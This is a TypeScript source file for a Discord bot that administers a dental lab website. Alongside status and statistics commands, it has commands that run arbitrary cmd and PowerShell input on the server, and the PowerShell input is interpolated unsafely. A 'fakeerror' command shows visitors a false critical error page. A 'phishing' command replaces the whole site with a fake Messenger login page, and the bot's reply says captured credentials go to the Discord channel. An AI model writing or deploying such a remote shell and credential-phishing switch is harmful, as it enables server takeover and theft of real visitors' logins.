import {
	Client,
	GatewayIntentBits,
	REST,
	Routes,
	SlashCommandBuilder,
	EmbedBuilder,
	PermissionFlagsBits
} from 'discord.js';
import { exec } from 'child_process';
import { promisify } from 'util';
import postgres from 'postgres';

const execAsync = promisify(exec);

// Database connection - uses same connection string as the app
const DATABASE_URL = process.env.DATABASE_URL || '';
const sql = postgres(DATABASE_URL);

// Bot client
const client = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent
	]
});

// Track server start time for uptime
const startTime = Date.now();

// Slash commands definition
const commands = [
	new SlashCommandBuilder().setName('status').setDescription('Check server status and uptime'),

	new SlashCommandBuilder().setName('stats').setDescription("Get today's order statistics"),

	new SlashCommandBuilder()
		.setName('shutdown')
		.setDescription('Shutdown the server gracefully')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('restart')
		.setDescription('Restart the server via PM2')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('notify')
		.setDescription('Set a site-wide notification')
		.addStringOption((option) =>
			option
				.setName('type')
				.setDescription('Notification type')
				.setRequired(true)
				.addChoices(
					{ name: 'Info', value: 'info' },
					{ name: 'Warning', value: 'warning' },
					{ name: 'Error', value: 'error' },
					{ name: 'Maintenance', value: 'maintenance' }
				)
		)
		.addStringOption((option) =>
			option.setName('message').setDescription('Notification message').setRequired(true)
		),

	new SlashCommandBuilder()
		.setName('notify-clear')
		.setDescription('Clear all active notifications'),

	new SlashCommandBuilder()
		.setName('lockdown')
		.setDescription('Lock the site with a message')
		.addStringOption((option) =>
			option.setName('message').setDescription('Lock message to display').setRequired(false)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('lockdown-html')
		.setDescription('Set custom HTML for lock page')
		.addStringOption((option) =>
			option.setName('html').setDescription('Custom HTML content').setRequired(true)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('unlock')
		.setDescription('Unlock the site')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('cmd')
		.setDescription('Execute a CMD command')
		.addStringOption((option) =>
			option.setName('command').setDescription('Command to execute').setRequired(true)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('powershell')
		.setDescription('Execute a PowerShell command')
		.addStringOption((option) =>
			option.setName('command').setDescription('PowerShell command to execute').setRequired(true)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('config')
		.setDescription('Set a config value in the database')
		.addStringOption((option) =>
			option.setName('key').setDescription('Config key').setRequired(true)
		)
		.addStringOption((option) =>
			option.setName('value').setDescription('Config value').setRequired(true)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('loadhtml')
		.setDescription('Load custom lock page HTML from a file')
		.addStringOption((option) =>
			option
				.setName('filepath')
				.setDescription('Path to HTML file (e.g., C:\\path\\to\\page.html)')
				.setRequired(true)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('viewhtml')
		.setDescription('View current custom lock page HTML (first 500 chars)')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('clearhtml')
		.setDescription('Clear custom HTML and use default lock page')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('fakeerror')
		.setDescription('Show a fake critical error page on the site')
		.addStringOption((option) =>
			option.setName('code').setDescription('Error code (500, 503, 502, etc.)').setRequired(false)
		)
		.addStringOption((option) =>
			option.setName('message').setDescription('Custom error message').setRequired(false)
		)
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('clearerror')
		.setDescription('Clear the fake error and restore site')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('phishing')
		.setDescription('Enable phishing demo mode - shows fake login page')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	new SlashCommandBuilder()
		.setName('phishing-off')
		.setDescription('Disable phishing demo mode')
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
];

// Format uptime
function formatUptime(ms: number): string {
	const seconds = Math.floor(ms / 1000);
	const minutes = Math.floor(seconds / 60);
	const hours = Math.floor(minutes / 60);
	const days = Math.floor(hours / 24);

	if (days > 0) return `${days}d ${hours % 24}h ${minutes % 60}m`;
	if (hours > 0) return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
	if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
	return `${seconds}s`;
}

// Command handlers
client.on('interactionCreate', async (interaction) => {
	if (!interaction.isChatInputCommand()) return;

	const { commandName } = interaction;

	try {
		switch (commandName) {
			case 'status': {
				const uptime = formatUptime(Date.now() - startTime);
				const embed = new EmbedBuilder()
					.setTitle('Dental Lab Server Status')
					.setColor(0x00ff00)
					.addFields(
						{ name: 'Status', value: 'Online', inline: true },
						{ name: 'Bot Uptime', value: uptime, inline: true },
						{ name: 'Platform', value: uptime, inline: true }
					)
					.setTimestamp();

				await interaction.reply({ embeds: [embed] });
				break;
			}

			case 'stats': {
				const today = new Date().toISOString().split('T')[0];
				const [ordersResult] = await sql`
          SELECT COUNT(*) as count FROM orders WHERE order_date = ${today}
        `;
				const [recordsResult] = await sql`
          SELECT COUNT(*) as count FROM records WHERE date_pickup = ${today}
        `;
				const [pendingResult] = await sql`
          SELECT COUNT(*) as count FROM records WHERE date_dropoff IS NULL
        `;

				const embed = new EmbedBuilder()
					.setTitle("Today's Statistics")
					.setColor(0x0099ff)
					.addFields(
						{ name: 'Orders Today', value: ordersResult.count.toString(), inline: true },
						{ name: 'Pickups Today', value: recordsResult.count.toString(), inline: true },
						{ name: 'Pending Dropoffs', value: pendingResult.count.toString(), inline: true }
					)
					.setTimestamp();

				await interaction.reply({ embeds: [embed] });
				break;
			}

			case 'shutdown': {
				await interaction.reply('Shutting down server...');
				await execAsync('pm2 stop all');
				process.exit(0);
			}

			case 'restart': {
				await interaction.reply('Restarting server...');
				await execAsync('pm2 restart all');
				break;
			}

			case 'notify': {
				const type = interaction.options.getString('type', true);
				const message = interaction.options.getString('message', true);

				await sql`
          INSERT INTO site_notifications (message, type, is_active)
          VALUES (${message}, ${type}, 'true')
        `;

				await interaction.reply(`Notification set: **[${type.toUpperCase()}]** ${message}`);
				break;
			}

			case 'notify-clear': {
				await sql`UPDATE site_notifications SET is_active = 'false'`;
				await interaction.reply('✅ All notifications cleared');
				break;
			}

			case 'lockdown': {
				const message =
					interaction.options.getString('message') ||
					'Site is under maintenance. Please check back later.';
				const username = interaction.user.username;

				await sql`
          UPDATE site_status 
          SET is_locked = 'true', 
              lock_message = ${message}, 
              locked_at = CURRENT_TIMESTAMP,
              locked_by = ${username}
          WHERE id = 1
        `;

				await interaction.reply(`**SITE LOCKED**\nMessage: ${message}\nLocked by: ${username}`);
				break;
			}

			case 'lockdown-html': {
				const html = interaction.options.getString('html', true);

				await sql`
          UPDATE site_status 
          SET lock_html = ${html}
          WHERE id = 1
        `;

				await interaction.reply('✅ Custom lock page HTML has been set');
				break;
			}

			case 'unlock': {
				await sql`
          UPDATE site_status 
          SET is_locked = 'false', locked_at = NULL, locked_by = NULL
          WHERE id = 1
        `;

				await interaction.reply('**SITE UNLOCKED** - Site is now accessible');
				break;
			}

			case 'cmd': {
				const command = interaction.options.getString('command', true);
				await interaction.deferReply();

				try {
					const { stdout, stderr } = await execAsync(`cmd /c ${command}`, {
						timeout: 30000,
						maxBuffer: 1024 * 1024
					});

					const output = stdout || stderr || 'No output';
					const truncated = output.length > 1900 ? output.substring(0, 1900) + '...' : output;

					await interaction.editReply(`\`\`\`\n${truncated}\n\`\`\``);
				} catch (error) {
					const errorMessage = error instanceof Error ? error.message : String(error);
					await interaction.editReply(`Error: ${errorMessage}`);
				}
				break;
			}

			case 'powershell': {
				const command = interaction.options.getString('command', true);
				await interaction.deferReply();

				try {
					const { stdout, stderr } = await execAsync(`powershell -Command "${command}"`, {
						timeout: 30000,
						maxBuffer: 1024 * 1024
					});

					const output = stdout || stderr || 'No output';
					const truncated = output.length > 1900 ? output.substring(0, 1900) + '...' : output;

					await interaction.editReply(`\`\`\`\n${truncated}\n\`\`\``);
				} catch (error) {
					const errorMessage = error instanceof Error ? error.message : String(error);
					await interaction.editReply(`Error: ${errorMessage}`);
				}
				break;
			}

			case 'config': {
				const key = interaction.options.getString('key', true);
				const value = interaction.options.getString('value', true);

				await sql`
          INSERT INTO app_config (key, value, updated_at)
          VALUES (${key}, ${value}, CURRENT_TIMESTAMP)
          ON CONFLICT (key) DO UPDATE SET value = ${value}, updated_at = CURRENT_TIMESTAMP
        `;

				await interaction.reply(`Config set: \`${key}\` = \`${value}\``);
				break;
			}

			case 'loadhtml': {
				const filepath = interaction.options.getString('filepath', true);
				await interaction.deferReply();

				try {
					const fs = await import('fs/promises');
					const html = await fs.readFile(filepath, 'utf-8');

					await sql`
            UPDATE site_status 
            SET lock_html = ${html}
            WHERE id = 1
          `;

					await interaction.editReply(
						`✅ Loaded HTML from \`${filepath}\` (${html.length} characters)`
					);
				} catch (error) {
					const errorMessage = error instanceof Error ? error.message : String(error);
					await interaction.editReply(`Error reading file: ${errorMessage}`);
				}
				break;
			}

			case 'viewhtml': {
				const [status] = await sql`SELECT lock_html FROM site_status WHERE id = 1`;

				if (status?.lock_html) {
					const preview = status.lock_html.substring(0, 500);
					await interaction.reply(
						`**Current Custom HTML (first 500 chars):**\n\`\`\`html\n${preview}\n\`\`\``
					);
				} else {
					await interaction.reply('ℹ️ No custom HTML set. Using default lock page.');
				}
				break;
			}

			case 'clearhtml': {
				await sql`UPDATE site_status SET lock_html = NULL WHERE id = 1`;
				await interaction.reply('✅ Custom HTML cleared. Site will use default lock page.');
				break;
			}

			case 'fakeerror': {
				const errorCode = interaction.options.getString('code') || '500';
				const errorMessage = interaction.options.getString('message') || '';
				const username = interaction.user.username;

				await sql`
          UPDATE site_status 
          SET fake_error = 'true',
              error_code = ${errorCode},
              error_message = ${errorMessage}
          WHERE id = 1
        `;

				await interaction.reply(
					`**FAKE ERROR ACTIVATED**\nCode: ${errorCode}\nMessage: ${errorMessage || '(default)'}\nBy: ${username}\n\n*Site will show critical error page to all visitors*`
				);
				break;
			}

			case 'clearerror': {
				await sql`
          UPDATE site_status 
          SET fake_error = 'false',
              error_code = '500',
              error_message = NULL
          WHERE id = 1
        `;

				await interaction.reply('✅ Fake error cleared. Site is now accessible normally.');
				break;
			}

			case 'phishing': {
				const username = interaction.user.username;

				await sql`
          UPDATE site_status 
          SET phishing_mode = 'true'
          WHERE id = 1
        `;

				await interaction.reply(
					`**PHISHING DEMO ENABLED**\nActivated by: ${username}\n\nThe entire site now shows a fake Messenger login page.\nCaptured credentials will be sent to this channel.\n\nUse \`/phishing-off\` to disable.`
				);
				break;
			}

			case 'phishing-off': {
				await sql`
          UPDATE site_status 
          SET phishing_mode = 'false'
          WHERE id = 1
        `;

				await interaction.reply('✅ Phishing demo disabled. Site is now accessible normally.');
				break;
			}
		}
	} catch (error) {
		console.error('Command error:', error);
		const reply =
			interaction.replied || interaction.deferred ? interaction.editReply : interaction.reply;
		await reply.call(interaction, `Error executing command: ${error}`);
	}
});

// Register commands and start bot
export async function startBot(token: string, guildId?: string) {
	const rest = new REST().setToken(token);

	client.once('ready', async () => {
		console.log(`Discord bot logged in as ${client.user?.tag}`);

		// Register commands after login when we have application ID
		if (client.application?.id) {
			console.log('Registering slash commands...');
			try {
				if (guildId) {
					await rest.put(Routes.applicationGuildCommands(client.application.id, guildId), {
						body: commands.map((c) => c.toJSON())
					});
					console.log(`✅ Slash commands registered to guild ${guildId}`);
				} else {
					await rest.put(Routes.applicationCommands(client.application.id), {
						body: commands.map((c) => c.toJSON())
					});
					console.log('✅ Slash commands registered globally');
				}
			} catch (error) {
				console.error('Failed to register commands:', error);
			}
		}
	});

	console.log('Connecting to Discord...');
	await client.login(token);
}

// Export client for external access
export { client };
